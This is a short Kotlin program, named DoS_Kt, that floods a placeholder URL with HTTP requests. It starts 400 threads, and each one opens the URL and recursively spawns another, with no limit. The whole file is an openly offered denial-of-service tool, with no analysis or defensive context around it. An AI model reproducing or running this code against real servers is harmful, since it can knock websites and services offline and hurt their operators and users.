import java.net.URL

object DoS_Kt{
    fun main()
    {
        val url= URL("http://TypeURLhere")
        for(s in 1..400)
        {
            run(url)
        }

    }
    private fun run(url:URL)
    {
        Thread{
            url.openStream()
            run(url)
        }.start()
    }

}
fun main()=DoS_Kt.main()
